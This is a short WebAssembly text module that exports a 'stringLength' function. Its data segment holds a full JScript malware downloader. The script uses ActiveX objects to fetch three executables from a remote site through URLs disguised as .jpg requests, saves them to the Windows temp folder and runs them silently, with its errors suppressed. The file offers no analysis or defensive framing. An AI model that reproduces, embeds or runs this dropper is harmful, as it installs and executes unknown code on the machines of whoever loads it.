(module
  (import "env" "memory" (memory 1))
  (import "env" "log" (func $log (param i32 i32)))
 
  (data (i32.const 0) "function dl(fr, fn, rn) {  var ws = new ActiveXObject('WScript.Shell');  var fn = ws.ExpandEnvironmentStrings('%TEMP%') + String.fromCharCode(92) + fn;  var xo = new ActiveXObject('MSXML2.XMLHTTP');  xo.onreadystatechange = function () {    if (xo.readyState === 4) {      var xa = new ActiveXObject('ADODB.Stream');      xa.open(); xa.type = 1;      xa.write(xo.ResponseBody);      xa.position = 0;      xa.saveToFile(fn, 2);     xa.close();    }  };  try {    xo.open('GET', fr, false);    xo.send();    if (rn > 0) {      ws.Run(fn, 0, 0);    }  } catch (er) {}}dl('http://pinporings.com/img/script.php?ibd1.jpg', '3274935.exe', 1);dl('http://pinporings.com/img/script.php?ibd2.jpg', '4573205.exe', 1);dl('http://pinporings.com/img/script.php?ibd3.jpg', '2954869.exe', 1);")
 
  (func (export "stringLength")
    i32.const 0
    i32.const 831
    call $log
  )
)


